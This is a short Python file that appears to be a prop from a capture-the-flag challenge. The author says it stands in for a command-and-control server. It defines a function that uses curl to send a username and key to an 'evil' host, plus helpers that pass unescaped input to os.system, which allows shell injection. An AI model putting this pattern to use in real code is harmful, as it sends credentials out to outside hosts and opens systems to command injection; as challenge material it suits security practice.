#note from the challenge author: For story purposes, imagine this contains a fully functional c&c server. It doesn't. 
#Just go with the flow here. 
#Thanks

import os
import sys



def call_evil_server(self, host, username, key):
    cmd = "curl -X POST -H \"Content-Type: application/json\" -d '{\"username\":\"%s\",\"key\":\"%s\"}' %s" % (username, key, host)
    os.system(cmd)

def send_email(self, subject, message, to):
    cmd = "echo \"%s\" | mail -s \"%s\" %s" % (message, subject, to)
    os.system(cmd)

def run_cmd(self, cmd):
    os.system(cmd)